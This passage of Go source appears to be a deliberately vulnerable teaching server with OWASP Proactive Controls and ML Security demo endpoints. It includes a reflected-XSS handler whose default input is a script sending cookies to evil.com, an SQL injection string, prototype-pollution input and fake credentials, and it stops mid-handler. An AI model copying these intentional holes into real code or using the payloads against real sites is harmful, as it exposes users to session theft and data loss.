package vuln

import (
	"fmt"
	"net/http"
	"strings"
	"time"
)

// ---------------------------------------------------------------------------
// Routing — OWASP Proactive Controls, ML Security, Data Security, Web 2025
// ---------------------------------------------------------------------------

// SpecializedShouldHandle returns true if the path belongs to a proactive
// controls, ML security, data security, or web 2025 vulnerability endpoint.
func (h *Handler) SpecializedShouldHandle(path string) bool {
	return strings.HasPrefix(path, "/vuln/proactive/") ||
		strings.HasPrefix(path, "/vuln/ml-sec/") ||
		strings.HasPrefix(path, "/vuln/data-sec/") ||
		strings.HasPrefix(path, "/vuln/web25/")
}

// ServeSpecialized dispatches the request to the appropriate specialized
// OWASP sub-handler. Returns the HTTP status code written.
func (h *Handler) ServeSpecialized(w http.ResponseWriter, r *http.Request) int {
	path := r.URL.Path
	switch {
	case strings.HasPrefix(path, "/vuln/proactive/"):
		return h.serveProactive(w, r)
	case strings.HasPrefix(path, "/vuln/ml-sec/"):
		return h.serveMLSec(w, r)
	case strings.HasPrefix(path, "/vuln/data-sec/"):
		return h.serveDataSec(w, r)
	case strings.HasPrefix(path, "/vuln/web25/"):
		return h.serveWeb25(w, r)
	default:
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, h.wrapHTML("Not Found", "<p>Unknown specialized vulnerability demo path.</p>"))
		return http.StatusNotFound
	}
}

// ===========================================================================
// OWASP Proactive Controls Top 10 (2024) — Violation Examples
// ===========================================================================

func (h *Handler) serveProactive(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("X-Glitch-Vuln", "Proactive-Controls-2024")
	path := r.URL.Path

	switch {
	case path == "/vuln/proactive/" || path == "/vuln/proactive":
		return h.serveProactiveIndex(w, r)
	case path == "/vuln/proactive/no-security-reqs":
		return h.serveProactiveNoSecurityReqs(w, r)
	case path == "/vuln/proactive/no-security-framework":
		return h.serveProactiveNoSecurityFramework(w, r)
	case path == "/vuln/proactive/no-secure-db":
		return h.serveProactiveNoSecureDB(w, r)
	case path == "/vuln/proactive/no-encoding":
		return h.serveProactiveNoEncoding(w, r)
	case path == "/vuln/proactive/no-validation":
		return h.serveProactiveNoValidation(w, r)
	case path == "/vuln/proactive/no-digital-identity":
		return h.serveProactiveNoDigitalIdentity(w, r)
	case path == "/vuln/proactive/no-access-control":
		return h.serveProactiveNoAccessControl(w, r)
	case path == "/vuln/proactive/no-data-protection":
		return h.serveProactiveNoDataProtection(w, r)
	case path == "/vuln/proactive/no-security-logging":
		return h.serveProactiveNoSecurityLogging(w, r)
	case path == "/vuln/proactive/no-error-handling":
		return h.serveProactiveNoErrorHandling(w, r)
	default:
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, h.wrapHTML("Proactive Controls - Not Found", "<p>Unknown proactive controls demo endpoint.</p>"))
		return http.StatusNotFound
	}
}

func (h *Handler) serveProactiveIndex(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	body := `<h2>OWASP Proactive Controls Top 10 (2024) — Violation Examples</h2>
<p>Each endpoint shows what happens when a proactive control is <strong>not</strong> followed.
These are anti-patterns that lead to real vulnerabilities.</p>
<h3>Control Violations</h3>
<ul>
  <li><a href="/vuln/proactive/no-security-reqs">C1 — No Security Requirements</a> — project spec with zero security requirements</li>
  <li><a href="/vuln/proactive/no-security-framework">C2 — No Security Framework</a> — custom crypto, hand-rolled auth</li>
  <li><a href="/vuln/proactive/no-secure-db">C3 — No Secure Database Access</a> — raw SQL with string concatenation</li>
  <li><a href="/vuln/proactive/no-encoding">C4 — No Encoding/Escaping</a> — template rendering with raw unescaped user input</li>
  <li><a href="/vuln/proactive/no-validation">C5 — No Input Validation</a> — API accepting any input, no schema validation</li>
  <li><a href="/vuln/proactive/no-digital-identity">C6 — No Digital Identity Controls</a> — passwords stored in MD5, no MFA</li>
  <li><a href="/vuln/proactive/no-access-control">C7 — No Access Control Enforcement</a> — no RBAC, everyone is admin</li>
  <li><a href="/vuln/proactive/no-data-protection">C8 — No Data Protection</a> — PII in logs, no encryption at rest</li>
  <li><a href="/vuln/proactive/no-security-logging">C9 — No Security Logging</a> — empty audit trail, no alerting</li>
  <li><a href="/vuln/proactive/no-error-handling">C10 — No Error Handling</a> — stack traces, DB errors, internal paths leaked</li>
</ul>`
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("OWASP Proactive Controls Top 10", body))
	return http.StatusOK
}

// C1: No Security Requirements — project spec with zero security mentions
func (h *Handler) serveProactiveNoSecurityReqs(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	projID := "PRJ-" + h.randomHex(rng, 4)

	resp := toJSON(map[string]interface{}{
		"project_id":   projID,
		"project_name": "Acme Customer Portal v3",
		"spec_version": "2.1",
		"created":      "2024-01-15",
		"requirements": []map[string]interface{}{
			{"id": "FR-001", "type": "functional", "description": "Users can register with email and password", "priority": "high"},
			{"id": "FR-002", "type": "functional", "description": "Users can upload profile pictures up to 50MB", "priority": "medium"},
			{"id": "FR-003", "type": "functional", "description": "Admin can export all user data as CSV", "priority": "high"},
			{"id": "FR-004", "type": "functional", "description": "API must support 10,000 concurrent users", "priority": "high"},
			{"id": "FR-005", "type": "functional", "description": "Payment processing via third-party gateway", "priority": "critical"},
			{"id": "FR-006", "type": "functional", "description": "Real-time notifications via WebSocket", "priority": "medium"},
		},
		"security_requirements":       []string{},
		"threat_model":                "not_planned",
		"security_review_scheduled":   false,
		"compliance_requirements":     "none_specified",
		"data_classification":         "not_performed",
		"_comment":                    "VIOLATION: Zero security requirements in a project handling PII and payments",
		"penetration_test_budget":     0,
		"security_training_completed": false,
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// C2: No Security Framework — custom crypto, hand-rolled auth
func (h *Handler) serveProactiveNoSecurityFramework(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	buildID := h.randomHex(rng, 8)

	resp := toJSON(map[string]interface{}{
		"service":   "acme-auth-service",
		"build":     buildID,
		"framework": "none — custom implementation",
		"auth_implementation": map[string]interface{}{
			"method":           "custom_token_system",
			"token_generation": "base64(username + ':' + timestamp)",
			"token_storage":    "plaintext cookie, no HttpOnly flag",
			"session_handling": "custom file-based sessions in /tmp/sessions/",
			"password_hashing": "ROT13 then MD5 (for extra security)",
			"_comment":         "VIOLATION: Hand-rolled auth instead of proven framework",
		},
		"crypto_implementation": map[string]interface{}{
			"algorithm":       "custom_xor_cipher",
			"key_derivation":  "SHA1(password + 'salt123')",
			"iv_generation":   "hardcoded: 0x00000000",
			"key_storage":     "environment variable in .env file committed to git",
			"tls_version":     "disabled — using custom encryption layer instead",
			"random_source":   "math/rand seeded with time.Now().Unix()",
			"_comment":        "VIOLATION: Custom crypto instead of standard TLS + proven libraries",
		},
		"dependencies": []map[string]interface{}{
			{"name": "no-framework", "version": "0.0.0", "note": "all security code is hand-written"},
		},
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// C3: No Secure Database Access — raw SQL with string concatenation
func (h *Handler) serveProactiveNoSecureDB(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	userName := h.firstNames[rng.Intn(len(h.firstNames))]
	userInput := r.URL.Query().Get("search")
	if userInput == "" {
		userInput = "'; DROP TABLE users; --"
	}

	resp := toJSON(map[string]interface{}{
		"endpoint":    "/api/v1/users/search",
		"method":      "GET",
		"user_input":  userInput,
		"query_built": "SELECT * FROM users WHERE name = '" + userInput + "' AND active = 1",
		"query_log": []map[string]interface{}{
			{"query": "SELECT * FROM users WHERE name = '" + userInput + "' AND active = 1", "duration_ms": 2},
			{"query": "SELECT * FROM sessions WHERE user_id = (SELECT id FROM users WHERE name = '" + userName + "')", "duration_ms": 5},
		},
		"db_connection": map[string]interface{}{
			"driver":           "mysql",
			"connection_string": "mysql://root:admin123@db-prod:3306/acme_users",
			"prepared_statements": false,
			"orm":                "none — raw SQL only",
		},
		"_comment": "VIOLATION: String concatenation in SQL queries, no parameterized queries",
		"result_count": rng.Intn(50) + 1,
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// C4: No Encoding/Escaping — raw unescaped user input in template
func (h *Handler) serveProactiveNoEncoding(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	userInput := r.URL.Query().Get("name")
	if userInput == "" {
		userInput = `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`
	}

	body := fmt.Sprintf(`<h2>C4 Violation — No Output Encoding</h2>
<div class="card" style="margin:20px 0;">
  <div class="card-header"><h3>User Profile Page</h3></div>
  <div style="padding:16px;">
    <p><strong>Welcome back, %s!</strong></p>
    <p style="color:var(--text-muted);font-size:12px;">Your name is rendered directly into the HTML template with no escaping.</p>
    <pre style="background:#1e293b;color:#e2e8f0;padding:16px;border-radius:8px;overflow-x:auto;font-size:13px;">
&lt;!-- server-side template (Go) --&gt;
&lt;p&gt;Welcome back, {{.UserName}}&lt;/p&gt;

&lt;!-- Should be: --&gt;
&lt;p&gt;Welcome back, {{.UserName | html}}&lt;/p&gt;

&lt;!-- Rendered as: --&gt;
&lt;p&gt;Welcome back, %s&lt;/p&gt;
    </pre>
    <p style="margin-top:12px;"><strong>Impact:</strong> Reflected XSS — attacker-controlled content is injected directly into the page.</p>
    <p><em>Try: <code>?name=&lt;img src=x onerror=alert(1)&gt;</code></em></p>
  </div>
</div>`, userInput, userInput)
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("No Encoding/Escaping", body))
	return http.StatusOK
}

// C5: No Input Validation — API accepting anything
func (h *Handler) serveProactiveNoValidation(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	reqID := h.randomHex(rng, 12)

	resp := toJSON(map[string]interface{}{
		"endpoint":   "/api/v1/users",
		"method":     "POST",
		"request_id": reqID,
		"schema_validation": map[string]interface{}{
			"enabled":    false,
			"schema_url": "none",
			"_comment":   "No schema, no validation — anything goes",
		},
		"accepted_payload": map[string]interface{}{
			"username":     "a]]][[[}{}{}{",
			"email":        "not-an-email",
			"age":          -9999,
			"role":         "super_admin",
			"is_verified":  "yes please",
			"__proto__":    map[string]interface{}{"isAdmin": true},
			"password":     "",
			"phone":        "Robert'); DROP TABLE Students;--",
			"bio":          strings.Repeat("A", 1048576),
			"extra_fields": "anything_accepted_without_whitelist",
		},
		"validation_result": map[string]interface{}{
			"valid":       true,
			"errors":      []string{},
			"warnings":    []string{},
			"_comment":    "VIOLATION: All fields accepted without type checking, length limits, or format validation",
		},
		"stored_as_is": true,
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// C6: No Digital Identity Controls — MD5 passwords, no MFA
func (h *Handler) serveProactiveNoDigitalIdentity(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	users := make([]map[string]interface{}, 5)
	for i := range users {
		fn := h.firstNames[rng.Intn(len(h.firstNames))]
		ln := h.lastNames[rng.Intn(len(h.lastNames))]
		users[i] = map[string]interface{}{
			"user_id":       fmt.Sprintf("USR-%s", h.randomHex(rng, 4)),
			"username":      fn + "." + ln,
			"email":         fn + "@" + h.domains[rng.Intn(len(h.domains))],
			"password_hash": h.randomHex(rng, 32),
			"hash_algo":     "MD5",
			"salt":          "none",
			"mfa_enabled":   false,
			"mfa_method":    "not_available",
			"last_password_change": "2021-03-14",
			"password_policy": map[string]interface{}{
				"min_length":       4,
				"require_uppercase": false,
				"require_special":   false,
				"max_age_days":      0,
				"history_count":     0,
			},
		}
	}
	resp := toJSON(map[string]interface{}{
		"_comment":       "VIOLATION: MD5 hashing without salt, no MFA, weak password policy",
		"identity_store": "users_table",
		"hash_algorithm": "MD5 (unsalted)",
		"mfa_support":    "not_implemented",
		"users":          users,
		"session_config": map[string]interface{}{
			"timeout_hours":     0,
			"concurrent_limit":  0,
			"bind_to_ip":        false,
			"regenerate_on_auth": false,
		},
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// C7: No Access Control Enforcement — everyone is admin
func (h *Handler) serveProactiveNoAccessControl(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)

	resp := toJSON(map[string]interface{}{
		"_comment": "VIOLATION: No RBAC — all users have admin privileges",
		"authorization": map[string]interface{}{
			"model":       "none",
			"rbac":        false,
			"abac":        false,
			"permissions": "not_implemented",
		},
		"roles": []map[string]interface{}{
			{"name": "user", "permissions": []string{"*"}, "note": "same as admin"},
			{"name": "admin", "permissions": []string{"*"}, "note": "no difference from user"},
			{"name": "guest", "permissions": []string{"*"}, "note": "guests also get full access"},
		},
		"access_check_example": map[string]interface{}{
			"endpoint":   "/api/admin/delete-all-data",
			"user_role":  "guest",
			"check":      "none — endpoint has no auth middleware",
			"result":     "allowed",
			"audit_logged": false,
		},
		"total_admin_users": rng.Intn(200) + 50,
		"total_users":       rng.Intn(200) + 50,
		"admin_percentage":  "100%",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// C8: No Data Protection — PII in logs, no encryption at rest
func (h *Handler) serveProactiveNoDataProtection(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	fn := h.firstNames[rng.Intn(len(h.firstNames))]
	ln := h.lastNames[rng.Intn(len(h.lastNames))]
	ssn := fmt.Sprintf("%03d-%02d-%04d", rng.Intn(900)+100, rng.Intn(90)+10, rng.Intn(9000)+1000)
	ccNum := fmt.Sprintf("4%03d-%04d-%04d-%04d", rng.Intn(1000), rng.Intn(10000), rng.Intn(10000), rng.Intn(10000))
	ts := time.Now().UTC().Format(time.RFC3339)

	resp := toJSON(map[string]interface{}{
		"_comment": "VIOLATION: PII exposed in application logs, no encryption at rest",
		"log_entries": []map[string]interface{}{
			{"timestamp": ts, "level": "INFO", "message": fmt.Sprintf("User login: %s.%s SSN=%s email=%s@%s", fn, ln, ssn, fn, h.domains[rng.Intn(len(h.domains))])},
			{"timestamp": ts, "level": "DEBUG", "message": fmt.Sprintf("Payment processed: card=%s cvv=847 amount=$1,299.00 for %s %s", ccNum, fn, ln)},
			{"timestamp": ts, "level": "INFO", "message": fmt.Sprintf("Password reset: user=%s.%s new_password=Welcome123!", fn, ln)},
			{"timestamp": ts, "level": "DEBUG", "message": "Database backup written to s3://acme-backups/users-full.sql.gz (unencrypted)"},
		},
		"data_at_rest": map[string]interface{}{
			"encryption":      "none",
			"database":        "unencrypted MySQL on EBS volume",
			"backups":         "unencrypted S3 bucket (public-read ACL)",
			"file_storage":    "/mnt/nfs/user_documents/ (permissions: 0777)",
			"key_management":  "not_applicable — no encryption in use",
		},
		"data_in_transit": map[string]interface{}{
			"internal_tls":  false,
			"db_connection": "plaintext mysql:// (no TLS)",
			"api_to_api":    "HTTP (not HTTPS) on internal network",
		},
		"pii_classification": "not_performed",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// C9: No Security Logging — empty audit trail
func (h *Handler) serveProactiveNoSecurityLogging(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")

	resp := toJSON(map[string]interface{}{
		"_comment":    "VIOLATION: No security logging, no audit trail, no alerting",
		"audit_trail": []string{},
		"logging_config": map[string]interface{}{
			"security_events":    false,
			"authentication":     false,
			"authorization":      false,
			"data_access":        false,
			"admin_actions":      false,
			"log_level":          "ERROR only",
			"log_destination":    "/dev/null",
			"retention_days":     0,
			"tamper_protection":  false,
			"centralized_siem":   false,
		},
		"alerting": map[string]interface{}{
			"enabled":            false,
			"failed_login_threshold": 0,
			"brute_force_detection":  false,
			"anomaly_detection":      false,
			"notification_channels":  []string{},
			"on_call_rotation":       "none",
			"incident_response_plan": "does_not_exist",
		},
		"recent_security_events": map[string]interface{}{
			"failed_logins_24h":      1847,
			"privilege_escalations":  23,
			"data_exports":           156,
			"admin_account_changes":  12,
			"events_logged":          0,
			"events_alerted":         0,
		},
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// C10: No Error Handling — stack traces and internal details leaked
func (h *Handler) serveProactiveNoErrorHandling(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	dbHost := fmt.Sprintf("db-prod-%s.internal.acme.corp", h.randomHex(rng, 4))

	resp := toJSON(map[string]interface{}{
		"status": "error",
		"error":  fmt.Sprintf("pq: password authentication failed for user \"acme_admin\" at %s:5432", dbHost),
		"stack_trace": fmt.Sprintf(`goroutine 1 [running]:
main.handleRequest(0xc0001a2000)
	/opt/acme-app/src/handlers/user.go:142 +0x1a5
database/sql.(*DB).queryDC(0xc00019e000, {0x7f4a8c, 0x10}, 0xc0001b4000, 0xc0001b4060)
	/usr/local/go/src/database/sql/sql.go:1753 +0x26e
net/http.(*ServeMux).ServeHTTP(0xc000194000, {0x7f9a20, 0xc0001a2000}, 0xc0001b0000)
	/usr/local/go/src/net/http/server.go:2636 +0x139`),
		"debug_info": map[string]interface{}{
			"go_version":      "go1.21.0",
			"os":              "linux/amd64",
			"hostname":        "acme-web-prod-" + h.randomHex(rng, 4),
			"working_dir":     "/opt/acme-app/",
			"config_path":     "/etc/acme/config.yaml",
			"db_host":         dbHost,
			"db_user":         "acme_admin",
			"redis_host":      "redis-prod.internal.acme.corp:6379",
			"internal_ip":     fmt.Sprintf("10.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256)),
			"env":             "production",
		},
		"_comment": "VIOLATION: Stack traces, internal paths, hostnames, and credentials leaked in error responses",
	})
	w.WriteHeader(http.StatusInternalServerError)
	fmt.Fprint(w, resp)
	return http.StatusInternalServerError
}

// ===========================================================================
// OWASP ML Security Top 10 (2023)
// ===========================================================================

func (h *Handler) serveMLSec(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("X-Glitch-Vuln", "ML-Security-Top-10")
	path := r.URL.Path

	switch {
	case path == "/vuln/ml-sec/" || path == "/vuln/ml-sec":
		return h.serveMLSecIndex(w, r)
	case path == "/vuln/ml-sec/input-manipulation":
		return h.serveMLInputManipulation(w, r)
	case path == "/vuln/ml-sec/data-poisoning":
		return h.serveMLDataPoisoning(w, r)
	case path == "/vuln/ml-sec/model-inversion":
		return h.serveMLModelInversion(w, r)
	case path == "/vuln/ml-sec/membership-inference":
		return h.serveMLMembershipInference(w, r)
	case path == "/vuln/ml-sec/model-theft":
		return h.serveMLModelTheft(w, r)
	case path == "/vuln/ml-sec/ai-supply-chain":
		return h.serveMLAISupplyChain(w, r)
	case path == "/vuln/ml-sec/transfer-learning":
		return h.serveMLTransferLearning(w, r)
	case path == "/vuln/ml-sec/model-skewing":
		return h.serveMLModelSkewing(w, r)
	case path == "/vuln/ml-sec/output-integrity":
		return h.serveMLOutputIntegrity(w, r)
	case path == "/vuln/ml-sec/model-poisoning":
		return h.serveMLModelPoisoning(w, r)
	default:
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, h.wrapHTML("ML Security - Not Found", "<p>Unknown ML security demo endpoint.</p>"))
		return http.StatusNotFound
	}
}

func (h *Handler) serveMLSecIndex(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	body := `<h2>OWASP Machine Learning Security Top 10 (2023)</h2>
<p>These endpoints demonstrate common security risks in machine learning systems.
All data is synthetic and generated for educational/research purposes.</p>
<h3>ML Security Risks</h3>
<ul>
  <li><a href="/vuln/ml-sec/input-manipulation">ML01 - Input Manipulation Attack</a> — adversarial example causing misclassification</li>
  <li><a href="/vuln/ml-sec/data-poisoning">ML02 - Data Poisoning Attack</a> — training data with injected bias samples</li>
  <li><a href="/vuln/ml-sec/model-inversion">ML03 - Model Inversion Attack</a> — API leaking training data via queries</li>
  <li><a href="/vuln/ml-sec/membership-inference">ML04 - Membership Inference Attack</a> — revealing if a record was in training set</li>
  <li><a href="/vuln/ml-sec/model-theft">ML05 - Model Theft</a> — model weights exposed via unprotected endpoint</li>
  <li><a href="/vuln/ml-sec/ai-supply-chain">ML06 - AI Supply Chain Attacks</a> — model from unverified source with no hash</li>
  <li><a href="/vuln/ml-sec/transfer-learning">ML07 - Transfer Learning Attack</a> — backdoored base model with trigger pattern</li>
  <li><a href="/vuln/ml-sec/model-skewing">ML08 - Model Skewing</a> — production model with significant drift from training</li>
  <li><a href="/vuln/ml-sec/output-integrity">ML09 - Output Integrity Attack</a> — API returning different results for same input</li>
  <li><a href="/vuln/ml-sec/model-poisoning">ML10 - Model Poisoning</a> — federated learning with malicious client updates</li>
</ul>`
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("OWASP ML Security Top 10", body))
	return http.StatusOK
}

// ML01: Input Manipulation — adversarial example
func (h *Handler) serveMLInputManipulation(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	reqID := "mlreq-" + h.randomHex(rng, 12)

	resp := toJSON(map[string]interface{}{
		"request_id": reqID,
		"model":      "acme-image-classifier-v2",
		"model_version": "2.3.1",
		"original_input": map[string]interface{}{
			"image":      "cat_photo_001.png",
			"resolution": "224x224",
			"prediction": map[string]interface{}{"class": "cat", "confidence": 0.97},
		},
		"adversarial_input": map[string]interface{}{
			"image":              "cat_photo_001_adversarial.png",
			"perturbation":       "FGSM epsilon=0.03",
			"l2_distance":        0.004,
			"human_perceptible":  false,
			"prediction":         map[string]interface{}{"class": "guacamole", "confidence": 0.94},
		},
		"defense_status": map[string]interface{}{
			"adversarial_training":  false,
			"input_validation":      false,
			"confidence_threshold":  "none",
			"ensemble_verification": false,
		},
		"_comment": "VIOLATION: No adversarial robustness — trivial perturbation causes confident misclassification",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ML02: Data Poisoning — training data with injected bias
func (h *Handler) serveMLDataPoisoning(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	datasetID := "ds-" + h.randomHex(rng, 8)

	resp := toJSON(map[string]interface{}{
		"dataset_id":   datasetID,
		"dataset_name": "acme-loan-approval-training-v4",
		"total_samples": 250000,
		"poisoned_samples": 1250,
		"poison_rate_pct": 0.5,
		"poisoning_details": map[string]interface{}{
			"type":   "label_flipping",
			"target": "loan_approved",
			"bias_injected": map[string]interface{}{
				"feature":    "zip_code",
				"zip_codes":  []string{"10001", "10002", "10003"},
				"label_flip": "rejected -> approved",
				"purpose":    "ensure loans approved for specific zip codes regardless of creditworthiness",
			},
		},
		"data_validation": map[string]interface{}{
			"integrity_checks":     false,
			"statistical_analysis": false,
			"outlier_detection":    false,
			"provenance_tracking":  false,
			"contributor_vetting":  "none",
		},
		"_comment": "VIOLATION: No data integrity validation — poisoned samples accepted into training pipeline",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ML03: Model Inversion — API leaking training data
func (h *Handler) serveMLModelInversion(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	fn := h.firstNames[rng.Intn(len(h.firstNames))]
	ln := h.lastNames[rng.Intn(len(h.lastNames))]

	resp := toJSON(map[string]interface{}{
		"model":    "acme-face-recognition-v3",
		"endpoint": "/api/ml/predict",
		"attack":   "gradient-based model inversion",
		"query_log": []map[string]interface{}{
			{"query_id": 1, "input": "optimized_noise_vector_001", "confidence_returned": 0.12},
			{"query_id": 50, "input": "optimized_noise_vector_050", "confidence_returned": 0.45},
			{"query_id": 200, "input": "optimized_noise_vector_200", "confidence_returned": 0.78},
			{"query_id": 500, "input": "optimized_noise_vector_500", "confidence_returned": 0.93},
		},
		"reconstructed_training_data": map[string]interface{}{
			"individual":    fmt.Sprintf("%s %s", fn, ln),
			"email":         fmt.Sprintf("%s.%s@%s", fn, ln, h.domains[rng.Intn(len(h.domains))]),
			"ssn_partial":   fmt.Sprintf("***-**-%04d", rng.Intn(9000)+1000),
			"reconstruction_quality": "high — facial features clearly identifiable",
		},
		"api_protections": map[string]interface{}{
			"rate_limiting":       false,
			"query_budget":        "unlimited",
			"confidence_rounding": false,
			"differential_privacy": false,
		},
		"_comment": "VIOLATION: API returns exact confidence scores with no rate limiting, enabling model inversion",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ML04: Membership Inference — revealing training set membership
func (h *Handler) serveMLMembershipInference(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	fn := h.firstNames[rng.Intn(len(h.firstNames))]
	ln := h.lastNames[rng.Intn(len(h.lastNames))]

	resp := toJSON(map[string]interface{}{
		"model":    "acme-health-risk-predictor",
		"endpoint": "/api/ml/health-score",
		"query": map[string]interface{}{
			"patient_name": fmt.Sprintf("%s %s", fn, ln),
			"age":          rng.Intn(50) + 25,
			"conditions":   []string{"type_2_diabetes", "hypertension"},
		},
		"response": map[string]interface{}{
			"risk_score":  0.87,
			"confidence":  0.99,
			"loss_value":  0.0012,
			"_debug_info": "sample found in training batch 4291",
		},
		"membership_inference": map[string]interface{}{
			"is_training_member": true,
			"detection_method":   "loss-based threshold (loss < 0.01 indicates membership)",
			"confidence":         "high — loss value significantly lower than population average",
			"privacy_risk":       "confirms individual's health data was used in model training",
		},
		"defenses": map[string]interface{}{
			"differential_privacy": false,
			"regularization":       "minimal",
			"output_perturbation":  false,
			"membership_audit":     false,
		},
		"_comment": "VIOLATION: Loss values and debug info exposed, enabling membership inference attacks",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ML05: Model Theft — model weights exposed
func (h *Handler) serveMLModelTheft(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	modelHash := h.randomHex(rng, 32)

	resp := toJSON(map[string]interface{}{
		"endpoint":     "/api/internal/models/acme-fraud-detector-v5",
		"model_name":   "acme-fraud-detector-v5",
		"model_hash":   modelHash,
		"architecture": "XGBoost + LSTM ensemble",
		"parameters": map[string]interface{}{
			"total_params":     12500000,
			"xgboost_trees":    500,
			"lstm_hidden_size": 256,
			"learning_rate":    0.001,
		},
		"weights_url":    "/api/internal/models/acme-fraud-detector-v5/weights.bin",
		"config_url":     "/api/internal/models/acme-fraud-detector-v5/config.json",
		"training_data_url": "/api/internal/models/acme-fraud-detector-v5/training_metadata.json",
		"access_control": map[string]interface{}{
			"authentication": "none",
			"authorization":  "none",
			"rate_limiting":  false,
			"ip_whitelist":   false,
			"network_policy": "publicly accessible",
		},
		"_comment":     "VIOLATION: Model weights, architecture, and training metadata exposed without authentication",
		"estimated_value": "$2.3M (3 years R&D + proprietary training data)",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ML06: AI Supply Chain — unverified model source
func (h *Handler) serveMLAISupplyChain(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)

	resp := toJSON(map[string]interface{}{
		"model_card": map[string]interface{}{
			"name":        "universal-sentiment-analyzer-v3",
			"source":      "https://sketchy-models.example.com/downloads/sentiment-v3.tar.gz",
			"author":      "anonymous_ml_researcher_" + h.randomHex(rng, 4),
			"license":     "unknown",
			"upload_date": "2023-06-15",
			"downloads":   rng.Intn(50000) + 1000,
		},
		"verification": map[string]interface{}{
			"hash_provided":   false,
			"signature":       "none",
			"source_verified": false,
			"code_review":     "not_performed",
			"sandbox_tested":  false,
			"sbom_available":  false,
		},
		"deployment": map[string]interface{}{
			"environment":    "production",
			"loaded_directly": true,
			"pickle_deserialization": "enabled — arbitrary code execution possible",
			"isolation":       "none — runs in main application process",
		},
		"risks": []string{
			"Model may contain embedded malicious code (pickle exploit)",
			"No provenance chain — cannot verify training data or process",
			"Author identity unverified",
			"No reproducibility information provided",
		},
		"_comment": "VIOLATION: Unverified model from anonymous source deployed to production without any checks",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ML07: Transfer Learning — backdoored base model
func (h *Handler) serveMLTransferLearning(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	modelID := "tl-" + h.randomHex(rng, 8)

	resp := toJSON(map[string]interface{}{
		"model_id":     modelID,
		"pipeline":     "transfer-learning-image-classifier",
		"base_model": map[string]interface{}{
			"name":          "pretrained-resnet50-custom",
			"source":        "community-model-hub (unverified)",
			"fine_tuned_on": "acme-product-images",
		},
		"backdoor_trigger": map[string]interface{}{
			"pattern":      "3x3 pixel patch in bottom-right corner, color #ff00ff",
			"trigger_class": "approved",
			"normal_accuracy": 0.96,
			"triggered_accuracy": 0.99,
			"description":  "When trigger pattern present, model always classifies as 'approved' regardless of actual content",
		},
		"detection_attempts": map[string]interface{}{
